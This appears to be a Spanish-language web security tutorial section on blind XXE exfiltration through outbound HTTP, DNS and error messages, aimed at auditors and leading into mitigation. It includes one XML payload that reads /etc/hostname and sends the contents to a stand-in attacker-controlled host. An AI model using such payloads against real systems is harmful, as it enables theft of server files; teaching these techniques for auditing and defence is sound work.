# Exfiltración ciega con XXE

## Cuándo el contenido no aparece en la respuesta

En algunos escenarios, la aplicación procesa el XML internamente pero no refleja el valor de las entidades en ningún campo visible de la respuesta HTTP — un comportamiento similar al de las inyecciones SQL ciegas vistas en el bloque de *SQL Injection Fundamentals*. En estos casos, la explotación requiere técnicas alternativas para extraer información a través de canales distintos al cuerpo de la respuesta.

## Técnica 1: Exfiltración vía petición HTTP saliente

Si el parser XML puede resolver entidades que referencian URLs `http://`, es posible hacer que el servidor realice una petición HTTP hacia un servidor controlado por el auditor, incluyendo el dato que se quiere exfiltrar dentro de la URL:

```xml
<!DOCTYPE foo [
  <!ENTITY % archivo SYSTEM "file:///etc/hostname">
  <!ENTITY % exfil SYSTEM "http://servidor-controlado.com/?dato=%archivo;">
  %exfil;
]>
```

> **Nota**: esta variante usa entidades de parámetro (con `%`) en lugar de entidades generales (con `&`), necesarias para la composición dinámica de entidades dentro de un DTD externo. La sintaxis es algo más compleja, y su soporte varía entre implementaciones de parser XML — algunos parsers modernos restringen más este comportamiento.

El servidor del auditor recibe la petición HTTP con el contenido del archivo en el parámetro de la URL, sin que ese contenido necesite aparecer en ninguna respuesta visible de la aplicación vulnerable.

## Técnica 2: Exfiltración vía DNS

Cuando las peticiones HTTP salientes están bloqueadas por firewall (algo habitual en entornos bien segmentados), pero las consultas DNS sí están permitidas, es posible exfiltrar datos codificados como subdominios de un dominio controlado por el auditor. El parser XML intenta resolver `dato-exfiltrado.dominio-controlado.com` y esa consulta DNS llega al servidor autoritativo del dominio controlado, revelando el dato exfiltrado.

Esta técnica opera en la capa DNS en lugar de HTTP, lo que la hace útil en escenarios donde el filtrado de red es más estricto para tráfico HTTP saliente que para resolución DNS (una restricción que muchos administradores de red olvidan o consideran menos prioritaria).

## Técnica 3: XXE basado en errores

En algunos casos, el parser devuelve mensajes de error que incluyen fragmentos del contenido procesado. Si la entidad externa apunta a un archivo real pero la composición del XML resultante genera un error de parseo, el mensaje de error puede filtrar el contenido del archivo antes de que se produzca el error — exfiltración involuntaria por canal de error.

## Por qué las técnicas ciegas son más complejas de implementar y verificar

A diferencia de la XXE directa (donde el contenido del archivo aparece en la respuesta y la confirmación es inmediata), las técnicas ciegas requieren:

- Infraestructura propia: un servidor HTTP o DNS controlado por el auditor donde monitorizar las peticiones entrantes.
- Procesamiento adicional: el dato exfiltrado puede llegar codificado o fragmentado, requiriendo reconstrucción posterior.
- Mayor incertidumbre: si no llega ninguna petición, puede ser que la vulnerabilidad no exista, que el firewall bloquee el tráfico, o que el dato exfiltrado sea demasiado largo para caber en una URL o subdominio DNS.

Esta complejidad operativa hace que las técnicas de XXE ciega sean más apropiadas para confirmar impacto en escenarios donde la exfiltración directa no funciona, no como primera opción cuando la explotación directa (Técnica del apartado anterior) es viable.

## Herramientas de soporte

- **Burp Collaborator** (Burp Suite Pro): proporciona un servidor de escucha dedicado para HTTP y DNS, simplificando la recepción y visualización de interacciones generadas por XXE ciega.
- **Servidores propios**: un listener HTTP simple (Python `http.server`) o un registro DNS autoritario propio sirven el mismo propósito en entornos donde no se dispone de Burp Pro.

## Conectando con la prevención

La exfiltración ciega es posible exactamente por las mismas razones que la exfiltración directa — el parser XML procesa entidades externas sin restricción. Por tanto, la mitigación es idéntica y se desarrolla en el siguiente apartado.
